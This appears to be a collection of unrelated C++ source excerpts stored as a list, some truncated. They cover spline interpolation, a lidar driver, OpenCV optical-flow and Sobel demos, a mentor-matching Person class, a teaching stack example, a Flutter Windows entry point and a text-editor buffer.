    "/***************************************************\nCopyright (c) 2019 Luis Llamas\n(www.luisllamas.es)\nLicensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0\nUnless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License\n ****************************************************/\n \n#include \"spline.h\"\n\nfloat Interpolation::Step(float xValues[], float yValues[], int numValues, float pointX, float threshold)\n{\n // extremos\n if (pointX <= xValues[0]) return yValues[0];\n if (pointX >= xValues[numValues - 1]) return yValues[numValues - 1];\n\n auto i = 0;\n while (pointX >= xValues[i + 1]) i++;\n  if (pointX == xValues[i + 1]) return yValues[i + 1]; // coincidencia exacta\n\n auto t = (pointX - xValues[i]) / (xValues[i + 1] - xValues[i]);  // punto relativo en el intervalo\n return t < threshold ? yValues[i] : yValues[i + 1];\n}\n\nfloat Interpolation::Linear(float xValues[], float yValues[], int numValues, float pointX, bool trim)\n{\n if (trim)\n {\n  if (pointX <= xValues[0]) return yValues[0];\n  if (pointX >= xValues[numValues - 1]) return yValues[numValues - 1];\n }\n\n auto i = 0;\n float rst = 0;\n if (pointX <= xValues[0])\n {\n  i = 0;\n  auto t = (pointX - xValues[i]) / (xValues[i + 1] - xValues[i]);\n  rst = yValues[i] * (1 - t) + yValues[i + 1] * t;\n }\n else if (pointX >= xValues[numValues - 1])\n {\n  auto t = (pointX - xValues[numValues - 2]) / (xValues[numValues - 1] - xValues[numValues - 2]);\n  rst = yValues[numValues - 2] * (1 - t) + yValues[numValues - 1] * t;\n }\n else\n {\n  while (pointX >= xValues[i + 1]) i++;\n  auto t = (pointX - xValues[i]) / (xValues[i + 1] - xValues[i]);\n  rst = yValues[i] * (1 - t) + yValues[i + 1] * t;\n }\n\n return rst;\n\n}\n\nfloat Interpolation::SmoothStep(float xValues[], float yValues[], int numValues, float pointX, bool trim)\n{\n if (trim)\n {\n  if (pointX <= xValues[0]) return yValues[0];\n  if (pointX >= xValues[numValues - 1]) return yValues[numValues - 1];\n }\n\n auto i = 0;\n if (pointX <= xValues[0]) i = 0;\n else if (pointX >= xValues[numValues - 1]) i = numValues - 1;\n else while (pointX >= xValues[i + 1]) i++;\n if (pointX == xValues[i + 1]) return yValues[i + 1];\n\n auto t = (pointX - xValues[i]) / (xValues[i + 1] - xValues[i]);\n t = t * t * (3 - 2 * t);\n return yValues[i] * (1 - t) + yValues[i + 1] * t;\n}\n\nfloat Interpolation::CatmullSpline(float xValues[], float yValues[], int numValues, float pointX, bool trim)\n{\n if (trim)\n {\n  if (pointX <= xValues[0]) return yValues[0];\n  if (pointX >= xValues[numValues - 1]) return yValues[numValues - 1];\n }\n\n auto i = 0;\n if (pointX <= xValues[0]) i = 0;\n else if (pointX >= xValues[numValues - 1]) i = numValues - 1;\n else while (pointX >= xValues[i + 1]) i++;\n if (pointX == xValues[i + 1]) return yValues[i + 1];\n\n auto t = (pointX - xValues[i]) / (xValues[i + 1] - xValues[i]);\n auto t_2 = t * t;\n auto t_3 = t_2 * t;\n\n auto h00 = 2 * t_3 - 3 * t_2 + 1;\n auto h10 = t_3 - 2 * t_2 + t;\n auto h01 = 3 * t_2 - 2 * t_3;\n auto h11 = t_3 - t_2;\n\n auto x0 = xValues[i];\n auto x1 = xValues[i + 1];\n auto y0 = yValues[i];\n auto y1 = yValues[i + 1];\n\n float m0;\n float m1;\n if (i == 0)\n {\n  m0 = (yValues[1] - yValues[0]) / (xValues[1] - xValues[0]);\n  m1 = (yValues[2] - yValues[0]) / (xValues[2] - xValues[0]);\n }\n else if (i == numValues - 2)\n {\n  m0 = (yValues[numValues - 1] - yValues[numValues - 3]) / (xValues[numValues - 1] - xValues[numValues - 3]);\n  m1 = (yValues[numValues - 1] - yValues[numValues - 2]) / (xValues[numValues - 1] - xValues[numValues - 2]);\n }\n else\n {\n  m0 = catmullSlope(xValues, yValues, numValues, i);\n  m1 = catmullSlope(xValues, yValues, numValues, i + 1);\n }\n\n auto rst = h00 * y0 + h01 * y1 + h10 * (x1 - x0) * m0 + h11 * (x1 - x0) * m1;\n return rst;\n}\n\nfloat Interpolation::catmullSlope(float x[], float y[], int n, int i)\n{\n if (x[i + 1] == x[i - 1]) return 0;\n return (y[i + 1] - y[i - 1]) / (x[i + 1] - x[i - 1]);\n}\n\nfloat Interpolation::ConstrainedSpline(float xValues[], float yValues[], int numValues, float pointX, bool trim)\n{\n if (trim)\n {\n  if (pointX <= xValues[0]) return yValues[0];\n  if (pointX >= xValues[numValues - 1]) return yValues[numValues - 1];\n }\n\n //auto i = 0;\n //while (pointX >= xValues[i + 1]) i++;\n //if (pointX == xValues[i + 1]) return yValues[i + 1];\n\n auto i = 0;\n if (pointX <= xValues[0]) i = 0;\n else if (pointX >= xValues[numValues - 1]) i = numValues - 1;\n else while (pointX >= xValues[i + 1]) i++;\n if (pointX == xValues[i + 1]) return yValues[i + 1];\n\n auto x0 = xValues[i + 1];\n auto x1 = xValues[i];\n auto y0 = yValues[i + 1];\n auto y1 = yValues[i];\n\n auto fd2i_xl1 = getLeftSecondDerivate(xValues, yValues, numValues - 1, i + 1);\n",
    "#include \"C_CSPC_Lidar.h\"\r\n#include \"common.h\"\r\n#include <map>\r\n#include <angles.h>\r\n#include <numeric>\r\n\r\nusing namespace std;\r\nusing namespace cspclidar;\r\nusing namespace impl;\r\nusing namespace angles;\r\n\r\n\r\n/*-------------------------------------------------------------\r\n\t\t\t\t\t\tConstructor\r\n-------------------------------------------------------------*/\r\nC_CSPC_Lidar::C_CSPC_Lidar(): lidarPtr(nullptr) {\r\n  m_SerialPort        = \"/dev/ttyUSB0\";\r\n  m_SerialBaudrate    = 115200;\r\n  m_FixedResolution   = true;\r\n  m_Reversion         = false;\r\n  m_Inverted          = false;//\r\n  m_AutoReconnect     = true;\r\n  m_SingleChannel     = false;\r\n  m_LidarType         = TYPE_TRIANGLE;\r\n  m_MaxAngle          = 360.0;\r\n  m_MinAngle          = 0.0;\r\n  m_MaxRange          = 10.0;\r\n  m_MinRange          = 0.10;\r\n  m_SampleRate        = 4;      //3.86\r\n  defalutSampleRate   = 5;\r\n  m_ScanFrequency     = 10;\r\n  m_GlassNoise        = true;\r\n  m_SunNoise          = true;\r\n  isScanning          = false;\r\n  m_FixedSize         = 720;\r\n  frequencyOffset     = 0.4;\r\n  m_AbnormalCheckCount  = 6;\r\n  Major               = 0;\r\n  Minjor              = 0;\r\n  m_IgnoreArray.clear();\r\n  m_PointTime         = 1e9 / 5000;\r\n  m_OffsetTime        = 0.0;\r\n  m_AngleOffset       = 0.0;\r\n  lidar_model = CSPCLIDAR_G2B;\r\n  last_node_time = getTime();\r\n  global_nodes = new node_info[CSPClidarDriver::MAX_SCAN_NODES];\r\n  m_ParseSuccess = false;\r\n}\r\n\r\n/*-------------------------------------------------------------\r\n                    ~C_CSPC_Lidar\r\n-------------------------------------------------------------*/\r\nC_CSPC_Lidar::~C_CSPC_Lidar() {\r\n  disconnecting();\r\n\r\n  if (global_nodes) {\r\n    delete[] global_nodes;\r\n    global_nodes = NULL;\r\n  }\r\n}\r\n\r\nvoid C_CSPC_Lidar::disconnecting() {\r\n  if (lidarPtr) {\r\n    lidarPtr->disconnect();\r\n    delete lidarPtr;\r\n    lidarPtr = nullptr;\r\n  }\r\n\r\n  isScanning = false;\r\n}\r\n\r\n//get zero angle offset value\r\nfloat C_CSPC_Lidar::getAngleOffset() const {\r\n  return m_AngleOffset;\r\n}\r\n\r\nbool C_CSPC_Lidar::isAngleOffetCorrected() const {\r\n  return m_isAngleOffsetCorrected;\r\n}\r\n\r\nstd::string C_CSPC_Lidar::getSoftVersion() const {\r\n  return m_lidarSoftVer;\r\n}\r\n\r\nstd::string C_CSPC_Lidar::getHardwareVersion() const {\r\n  return m_lidarHardVer;\r\n}\r\n\r\nstd::string C_CSPC_Lidar::getSerialNumber() const {\r\n  return m_lidarSerialNum;\r\n}\r\n\r\nbool C_CSPC_Lidar::isRangeValid(double reading) const {\r\n  if (reading >= m_MinRange && reading <= m_MaxRange) {\r\n    return true;\r\n  }\r\n\r\n  return false;\r\n}\r\n\r\nbool C_CSPC_Lidar::isRangeIgnore(double angle) const {\r\n  bool ret = false;\r\n\r\n  for (uint16_t j = 0; j < m_IgnoreArray.size(); j = j + 2) {\r\n    if ((angles::from_degrees(m_IgnoreArray[j]) <= angle) &&\r\n        (angle <= angles::from_degrees(m_IgnoreArray[j + 1]))) {\r\n      ret = true;\r\n      break;\r\n    }\r\n  }\r\n\r\n  return ret;\r\n}\r\n\r\n\r\n/*-------------------------------------------------------------\r\n\t\t\t\t\t\tdoProcessSimple\r\n-------------------------------------------------------------*/\r\n\r\nfloat angle_degress_format(float degress)\r\n{\r\n\twhile(degress >= 360.0f)\r\n\t{\r\n\t\tdegress -= 360.0f;\r\n\t}\r\n\twhile(degress < 0.0f)\r\n\t{\r\n\t\tdegress += 360.0f;\r\n\t}\r\n\treturn degress;\r\n}\r\n\r\nbool  C_CSPC_Lidar::doProcessSimple(LaserScan &outscan,\r\n                                bool &hardwareError) {\r\n  hardwareError\t\t\t= false;\r\n\r\n  // Bound?\r\n  if (!checkHardware()) {\r\n    hardwareError = true;\r\n    delay(200 / m_ScanFrequency);\r\n    return false;\r\n  }\r\n\r\n  size_t   count = CSPClidarDriver::MAX_SCAN_NODES;\r\n  //wait Scan data:\r\n  uint64_t tim_scan_start = getTime();\r\n  uint64_t startTs = tim_scan_start;\r\n  result_t op_result =  lidarPtr->grabScanData(global_nodes, count);\r\n  uint64_t tim_scan_end = getTime();\r\n  const float AngCorrect_fk = 19.16;\r\n  const float AngCorrect_fx = 90.15;\r\n  const float AngCorrect_fa = 12;\r\n\r\n  // Fill in scan data:\r\n  if (IS_OK(op_result)) {\r\n    uint64_t scan_time = m_PointTime * (count - 1);\r\n    tim_scan_end += m_OffsetTime * 1e9;\r\n    tim_scan_end -= m_PointTime;\r\n    tim_scan_end -= global_nodes[0].stamp;\r\n    tim_scan_start = tim_scan_end -  scan_time ;\r\n\r\n    if (tim_scan_start < startTs) {\r\n      tim_scan_start = startTs;\r\n      tim_scan_end = tim_scan_start + scan_time;\r\n    }\r\n\r\n    if ((last_node_time + m_PointTime) >= tim_scan_start) {\r\n      tim_scan_start = last_node_time + m_PointTime;\r\n      tim_scan_end = tim_scan_start + scan_time;\r\n    }\r\n\r\n    last_node_time = tim_scan_end;\r\n\r\n    if (m_MaxAngle < m_MinAngle) {\r\n      float temp = m_MinAngle;\r\n      m_MinAngle = m_MaxAngle;\r\n      m_MaxAngle = temp;\r\n    }\r\n\r\n    int all_node_count = count;\r\n\r\n    outscan.config.min_angle = m_MinAngle;\r\n    outscan.config.max_angle =  m_MaxAngle;\r\n    outscan.config.scan_time =  static_cast<float>(scan_time * 1.0 / 1e9);\r\n    outscan.config.time_increment = outscan.config.scan_time / (double)(count - 1);\r\n    outscan.config.min_range = m_MinRange;\r\n    outscan.config.max_range = m_MaxRange;\r\n    outscan.stamp = tim_scan_start;\r\n",
    "//\n// Created by Alan on 2024/3/26.\n//\n\n/* Quiz\n- \u7ed8\u5236\u5149\u6d41\n- \u52a0\u8f7d\u89c6\u9891\u3002\n- \u8c03\u7528\u5e93\u51fd\u6570\u5bfb\u627e\u7279\u5f81\u70b9\u3002\n- \u8c03\u7528\u5e93\u51fd\u6570\u8ba1\u7b97\u4e24\u5e27\u56fe\u50cf\u4e2d\u7279\u5f81\u70b9\u7684\u79fb\u52a8\u8ddd\u79bb\u3002\n- \u5220\u9664\u672a\u79fb\u52a8\u7684\u7279\u5f81\u70b9\u3002\n- \u5728\u79fb\u52a8\u7684\u70b9\u4e4b\u95f4\u7ed8\u5236\u7ebf\u6bb5\u3002\n\u4f7f\u7528openCV\u5e93\u548cc++\u5b9e\u73b0\n*/\n\n#include <opencv2/opencv.hpp>\n#include <vector>\n#include <iostream>\nusing namespace cv;\nusing namespace std;\n\nint main() {\n    // \u52a0\u8f7d\u89c6\u9891\n    VideoCapture cap(\"../cars.mp4\");\n\n    // \u68c0\u6d4b\u89c6\u9891\u662f\u5426\u6210\u529f\u6253\u5f00\n    if (!cap.isOpened()) {\n        cerr << \"Error opening video file\\n\";\n        return -1;\n    }\n\n    // \u521b\u5efa\u4e24\u4e2aMat\u5bf9\u8c61\uff0c\u7528\u4e8e\u5b58\u50a8\u4e24\u5e27\u56fe\u50cf\n    Mat old_frame, old_gray;\n    // \u521b\u5efa\u4e24\u4e2avector\u5bf9\u8c61\uff0c\u7528\u4e8e\u5b58\u50a8\u7279\u5f81\u70b9\n    vector<Point2f> p0, p1; // Point2f: 2D point with floating-point coordinates\n\n    // \u62ff\u53d6\u7b2c\u4e00\u5e27\u56fe\u50cf, \u5e76\u8f6c\u6362\u4e3a\u7070\u5ea6\u56fe\n    cap >> old_frame;\n    cvtColor(old_frame, old_gray, COLOR_BGR2GRAY);\n\n    // \u4f7f\u7528`goodFeaturesToTrack`\u4ece\u7b2c\u4e00\u5e27\u56fe\u50cf\u4e2d\u63d0\u53d6\u7279\u5f81\u70b9\n    goodFeaturesToTrack(old_gray, p0, 100, 0.3, 7, Mat(), 7, false, 0.04);\n\n    // \u83b7\u53d6\u89c6\u9891\u7684\u5c5e\u6027\n    int frame_width = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_WIDTH)); // \u5bbd\n    int frame_height = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_HEIGHT)); // \u9ad8\n    double fps = cap.get(cv::CAP_PROP_FPS); // \u5e27\u7387\n\n    // \u521b\u5efa\u89c6\u9891\u5199\u5165\u5bf9\u8c61, \u7528\u4e8e\u5b58\u50a8\u6700\u540e\u7684\u7ed3\u679c\n    cv::VideoWriter videoWriter(\"../Quiz1/output.mp4\", cv::VideoWriter::fourcc('m', 'p', '4', 'v'),\n                           fps, cv::Size(frame_width, frame_height), true);\n\n    // \u68c0\u6d4b\u89c6\u9891\u5199\u5165\u5bf9\u8c61\u662f\u5426\u6210\u529f\u6253\u5f00\n    if (!videoWriter.isOpened()) {\n        std::cerr << \"Error opening video writer\" << std::endl;\n        return -1;\n    }\n\n    // \u521b\u5efa\u4e00\u4e2amask\u56fe\u50cf, \u7528\u4e8e\u7ed8\u5236\n    Mat mask = Mat::zeros(old_frame.size(), old_frame.type());\n\n    while(true) { // \u5faa\u73af\u8bfb\u53d6\u89c6\u9891\u5e27\n        Mat frame, frame_gray; // \u521b\u5efa\u4e24\u4e2aMat\u5bf9\u8c61, \u7528\u4e8e\u5b58\u50a8\u5f53\u524d\u5e27\u56fe\u50cf\u548c\u7070\u5ea6\u56fe\n        cap >> frame; // \u8bfb\u53d6\u89c6\u9891\u5e27\n        if (frame.empty()) { // \u5982\u679c\u89c6\u9891\u5e27\u4e3a\u7a7a, \u9000\u51fa\u5faa\u73af\n            break;\n        }\n        cvtColor(frame, frame_gray, COLOR_BGR2GRAY); // \u5c06\u5f53\u524d\u5e27\u56fe\u50cf\u8f6c\u6362\u4e3a\u7070\u5ea6\u56fe\n\n\n        // \u8ba1\u7b97\u5149\u6d41\n        vector<uchar> status; // \u521b\u5efa\u4e00\u4e2avector\u5bf9\u8c61, \u7528\u4e8e\u5b58\u50a8\u7279\u5f81\u70b9\u7684\u72b6\u6001\n        vector<float> err; // \u521b\u5efa\u4e00\u4e2avector\u5bf9\u8c61, \u7528\u4e8e\u5b58\u50a8\u7279\u5f81\u70b9\u7684\u8bef\u5dee\n\n        // \u4f7f\u7528`calcOpticalFlowPyrLK`, \u8ba1\u7b97\u4e24\u5e27\u56fe\u50cf\u4e2d\u7279\u5f81\u70b9\u7684\u79fb\u52a8\u8ddd\u79bb\n        // status: 0\u8868\u793a\u7279\u5f81\u70b9i\u6ca1\u6709\u79fb\u52a8, 1\u8868\u793a\u7279\u5f81\u70b9i\u79fb\u52a8\u4e86\n        // err: \u7279\u5f81\u70b9i\u7684\u8bef\u5dee\n        calcOpticalFlowPyrLK(old_gray, frame_gray, p0, p1, status, err);\n\n\n        // \u904d\u5386\u7279\u5f81\u70b9, \u9009\u62e9\u597d\u7684\u7279\u5f81\u70b9, \u5e76\u7ed8\u5236\u7ebf\u6bb5\n        for (uint i = 0; i < p0.size(); i++) {\n\n            // Select good points\n            if (status[i] == 0) { // \u5982\u679cstatus[i] == 0, \u8868\u793a\u7279\u5f81\u70b9i\u6ca1\u6709\u79fb\u52a8\n                // \u5982\u679c\u7279\u5f81\u70b9i\u6ca1\u6709\u79fb\u52a8, \u5220\u9664\u7279\u5f81\u70b9i\n                p0.erase(p0.begin() + i);\n                p1.erase(p1.begin() + i);\n                continue;\n            }\n            // \u5982\u679c\u7279\u5f81\u70b9i\u79fb\u52a8\u4e86, \u7ed8\u5236\u7ebf\u6bb5\n            line(mask, p1[i], p0[i], Scalar(0, 255, 0), 2);\n            // line(img, pt1, pt2, color[, thickness[, lineType[, shift]]])\n            // thickness: \u7ebf\u7684\u5bbd\u5ea6\n\n            // \u7ed8\u5236\u7279\u5f81\u70b9\n            circle(frame, p1[i], 5, Scalar(0, 255, 0), -1);\n            // circle(img, center, radius, color[, thickness[, lineType[, shift]]])}\n            // thickness = -1: \u8868\u793a\u586b\u5145\u5706\n        }\n\n\n        Mat img; // \u521b\u5efa\u4e00\u4e2aMat\u5bf9\u8c61, \u7528\u4e8e\u5b58\u50a8\u6700\u7ec8\u7ed3\u679c\n        add(frame, mask, img); // \u5c06frame\u548cmask\u76f8\u52a0, \u5b58\u50a8\u5230img\u4e2d\n        videoWriter.write(img); // \u5c06img\u5199\u5165\u5230\u89c6\u9891\u4e2d\n\n        imshow(\"Frame\", img); // \u663e\u793a\u6bcf\u4e00\u5e27\u7684img, \u6700\u7ec8\u6548\u679c\u4e3a\u89c6\u9891\n        int keyboard = waitKey(30); // \u7b49\u5f8530ms, \u5982\u679c\u6309\u4e0b\u952e\u76d8, \u5219\u9000\u51fa\u5faa\u73af\n        if (keyboard == 'q' || keyboard == 27)\n            break;\n\n        // \u66f4\u65b0old_gray\u548cp0\n        old_gray = frame_gray.clone(); // \u66f4\u65b0old_gray\n        p0 = p1; // \u66f4\u65b0p0,\n\n    }\n    // \u91ca\u653e\u8d44\u6e90\n    videoWriter.release();\n    cap.release();\n    destroyAllWindows();\n    return 0;\n}",
    "#include <iostream>\n#include <opencv2/opencv.hpp>\n\n/**\n * @brief Default image data with values equal to 1 converted to 255.\n */\nunsigned char defaultImageData[12][12] = {\n    {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\n    {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\n    {0, 0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 0},\n    {0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0},\n    {0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0},\n    {0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0},\n    {0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0},\n    {0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 0, 0},\n    {0, 0, 0, 0, 255, 255, 255, 255, 255, 0, 0, 0},\n    {0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0},\n    {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\n    {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}};\n\n/**\n * @brief Prints the matrix representation of the image.\n *\n * @param image The image matrix.\n * @param N Size of the image matrix.\n */\nvoid printImageMatrix(cv::Mat image, int N = 12)\n{\n  for (int i = 0; i < N; i++)\n  {\n    for (int j = 0; j < N; j++)\n    {\n      int pixel_value = static_cast<int>(image.at<uchar>(i, j));\n      std::cout << pixel_value << \" \";\n    }\n    std::cout << std::endl;\n  }\n}\n\n/**\n * @brief Generates a circular image with given size.\n *\n * @param N Size of the image.\n * @return Generated image matrix.\n */\ncv::Mat generateImage(int N)\n{\n  cv::Mat image(N, N, CV_8UC1, cv::Scalar(0));\n\n  int center_x = N / 2;\n  int center_y = N / 2;\n  int radius = N / 4;\n\n  for (int i = 0; i < N; i++)\n  {\n    for (int j = 0; j < N; j++)\n    {\n      int distance = (i - center_x) * (i - center_x) + (j - center_y) * (j - center_y);\n      if (distance <= radius * radius)\n      {\n        image.at<uchar>(i, j) = 255;\n      }\n    }\n  }\n\n  return image;\n}\n\nint main()\n{\n  const int N = 12;\n  // cv::Mat image = generateImage(N);\n  cv::Mat image(N, N, CV_8UC1, defaultImageData);\n\n  std::cout << \"image\" << std::endl;\n  printImageMatrix(image, N);\n  cv::imwrite(\"../images/image.png\", image);\n\n  int scale = 1;\n  int delta = 0;\n  cv::Mat grad;\n  cv::Mat grad_x, grad_y;\n  cv::Mat abs_grad_x, abs_grad_y;\n\n  cv::Sobel(image, grad_x, CV_16S, 1, 0, 3, scale, delta, cv::BORDER_DEFAULT);\n  cv::imwrite(\"../images/grad_x.png\", grad_x);\n  std::cout << \"grad_x\" << std::endl;\n  printImageMatrix(grad_x, N);\n\n  cv::Sobel(image, grad_y, CV_16S, 0, 1, 3, scale, delta, cv::BORDER_DEFAULT);\n  cv::imwrite(\"../images/grad_y.png\", grad_y);\n  std::cout << \"grad_y\" << std::endl;\n  printImageMatrix(grad_y, N);\n\n  cv::convertScaleAbs(grad_x, abs_grad_x);\n  cv::imwrite(\"../images/abs_grad_x.png\", abs_grad_x);\n  std::cout << \"abs_grad_x\" << std::endl;\n  printImageMatrix(abs_grad_x, N);\n\n  cv::convertScaleAbs(grad_y, abs_grad_y);\n  cv::imwrite(\"../images/abs_grad_y.png\", abs_grad_y);\n  std::cout << \"abs_grad_y\" << std::endl;\n  printImageMatrix(abs_grad_y, N);\n\n  cv::addWeighted(abs_grad_x, 0.5, abs_grad_y, 0.5, 0, grad);\n  cv::imwrite(\"../images/grad.png\", grad);\n  std::cout << \"grad\" << std::endl;\n  printImageMatrix(grad, N);\n\n  return 0;\n}\n",
    "#include \"Person.h\"\n\nPerson::Person(){\n  name = \"\";\n  ifMentor = false;\n  formAnswers = nullptr;\n  ranking = nullptr;\n}\n\nPerson::Person(string name, bool ifMentor, LinkedList* formAnswers){\n  this -> name = name;\n  this -> ifMentor = ifMentor;\n  this -> formAnswers = formAnswers;\n  ranking = nullptr;\n}\n\nPerson::Person(string name, bool ifMentor, LinkedList* formAnswers, PriorityQueue* ranking){\n  this -> name = name;\n  this -> ifMentor = ifMentor;\n  this -> formAnswers = formAnswers;\n  this -> ranking = ranking;\n}\n\nstring Person::getName(){\n  return name;\n}\n\nvoid Person::setName(string name){\n  this -> name = name;\n}\n\nbool Person::getIfMentor(){\n  return ifMentor;\n}\n\nvoid Person::setIfMentor(bool change){\n  this -> ifMentor = change;\n}\n\nLinkedList* Person::getFormAnswers(){\n  return formAnswers;\n}\n\nvoid Person::setFormAnswers(LinkedList* formAnswers){\n  this -> formAnswers = formAnswers;\n}\n\nPriorityQueue* Person::getRanking(){\n  return ranking;\n}\n\nvoid Person::setRanking(PriorityQueue* ranking){\n  this -> ranking = ranking;\n}\n",
    "/*\n Program Name: Static_Stack.cpp\n Programmer: Moris Gomez\n Date: Tuesday 04/02/2024\n Version Control: 4.0\n About: Week 8, CSCI 2, Example 1.\n Description:\n    Intro to Static Stacks via arrays.\n*/#include <iostream>\n\nusing namespace std;\n\n//create IntStack:\nclass IntStack\n{\nprivate:\n    int *stackArray; //does stackArray point to the address of the first element?\n                    //would we need to derefrence each index to access value?\n    int size;\n    int top;\n\npublic:\n//CONSTRUCTOR:\n    IntStack(int sz)\n    {\n        //code for regular array: int name_array[sz];\n        stackArray = new int[sz]; //initializes stack array with a set size of 'sz'.\n        size = sz; //initializes the size of the stack array.\n        top = -1; //initializes the top of the stack array to -1.\n                  //-1 means empty stack array.\n    } //end constructor.\n    \n//COPY CONSTRUCTOR:\n    IntStack(const IntStack &obj) //& = reference, so changes to obj in func reflected in main.\n    {\n        //step 1: create stackArray.\n        if(obj.size > 0)\n        {\n            stackArray = new int[obj.size];\n        }\n        else\n        {\n            stackArray = NULL; //points to NULL bc no size of new obj.\n        }\n        //step 2: copy size variable.\n        size = obj.size;\n        //step 3: copy the stack contents.\n        for(int count = 0; count < size; count++)\n        {\n            stackArray[count] = obj.stackArray[count]; //obj3 = obj1.\n        } //end for loop.\n    } //end copy constructor.\n    \n    \n//MEMBER FUNCTION #1: isFull().\n    bool isFull() const //const = read-only func, so wont modify object it is called on.\n                        //sort of like a getter.\n    {\n        if(top == size - 1) //if top is size - 1, it if full\n                            //array size 5 needs to have top index as 4 to be full.\n        {\n            return true;\n        }\n        else\n        {\n            return false;\n        }\n    } //end isFull() function.\n    \n//MEMBER FUNCTION #2: isEmpty().\n    bool isEmpty() const\n    {\n        if(top == -1) //if top is -1, list is empty: -1 is initialized during constructor.\n        {\n            return true;\n        }\n        else\n        {\n            return false;\n        }\n    } //end isEmpty() function.\n    \n//MEMBER FUNCTION #3: push().\n    void push(int num)\n    {\n        if(isFull()) //if stack is full, cannot push bc arrays are fixed size.\n        {\n            cout << \"Stack is full.\" << endl;\n        }\n        else //not full.\n        {\n            top = top + 1; //top becomes new index.\n            stackArray[top] = num; //set that new index to num.\n        }\n    } //end push() function.\n    \n//MEMBER FUNCTION #4: pop().\n    void pop(int &num)\n    {\n        if(isEmpty()) //empty, so cannot remove any elements.\n        {\n            cout << \"Stack is empty.\" << endl;\n        }\n        else //has some indexes.\n        {\n            num = stackArray[top]; //assign top to num\n            top = top - 1;\n        }\n    } //end pop() function.\n    \n//MEMBER FUNCTION #5: peek().\n    int peek() const\n    {\n        if(isEmpty())\n        {\n            cout << \"Stack is empty.\" << endl;\n            return -1;\n        }\n        else\n        {\n            return stackArray[top];\n        }\n    } //end peek() function.\n\n//MEMBER FUNCTION #5: display().\n    void display()\n    {\n        int t = top; //last one in, first one out.\n        //using while loop to traverse through stack array.\n        while(t >= 0)\n        {\n            cout << stackArray[t] << endl;\n            t = t - 1;\n        } //end while loop.\n    } //end display() function.\n}; //end class IntStack.\n\n\n\n//DRIVER for IntStack class via main function:\nint main()\n{\n    //1)CREATE A STACK AND PUSH SOME VALUES:\n    IntStack stackOne(5); //creates a Static Stack w/ a fixed size of 5 elements using constructor.\n                //top = -1, size = 5.\n    stackOne.push(7); //first one in, last one out. = BOTTOM of stack.\n    stackOne.push(6);\n    stackOne.push(4);\n    stackOne.push(5);\n    stackOne.push(2); //last one in, first one out = TOP of stack.\n    stackOne.display();\n    //BOTTOM [7, 6, 4, 5, 2] TOP\n    //        0, 1, 2, 3, 4 =>indexes.\n    /*\n     TOP OF STACK:\n     value at index 4 = [2]\n     value at index 3 = [5]\n     value at index 2 = [4]\n     value at index 1 = [6]\n     value at index 0 = [7]\n     value at index -1 = [?] does index - 1 have a value?\n     BOTTOM OF STACK:\n     */\n    \n    //2)POP 1 VALUE FROM STACK:\n    int x;\n    stackOne.pop(x); //pops top index, must pass num as a variable.\n    //top index should now be 3 with value 5 bc index 4 w/ value 2 was popped off.\n    \n    //3) PEEK TO SEE TOP VALUE:\n    cout << \"the top value is now: \" << stackOne.peek() << endl; //peek returns the value at top index not indez itself. //should be 5\n    stackOne.display();\n    /*\n     value at index 3 = [5]\n     value at index 2 = [4]\n     value at index 1 = [6]\n     value at index 0 = [7]\n     */\n    \n    //4) USE ISFULL",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"tinker_alarm\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <string>\n\n#include \"buf.hpp\"\n#include \"term.hpp\"\n\nstd::vector<Buf> bufs;\n\nBuf::Buf(std::optional<std::wstring> filename) : m_filename(filename) {}\nvoid Buf::read() {\n  m_content.clear();\n  std::string narrowFilename(m_filename->begin(), m_filename->end());\n  std::wifstream ifile(narrowFilename);\n  std::wstring line;\n  while (std::getline(ifile, line)) {\n    m_content.push_back(line);\n  }\n}\nvoid Buf::write() {\n  std::string narrowFilename(m_filename->begin(), m_filename->end());\n  std::wofstream ofile(narrowFilename);\n  ofile << m_content[0];\n  for(int i=1;i<m_content.size();i++) {\n    ofile << std::endl << m_content[i];\n  }\n}\nvoid Buf::flush() {\n  term::cursor::save();\n  auto termSize = term::getSize();\n  term::cursor::setPos(0, 1);\n  for(int i=0;i<termSize.second-3;i++) {\n    term::clearInLine(term::selection::full);\n    term::cursor::down();\n  }\n  term::cursor::setPos(0, 1);\n  for(int i=0;i<m_content.size();i++) {\n    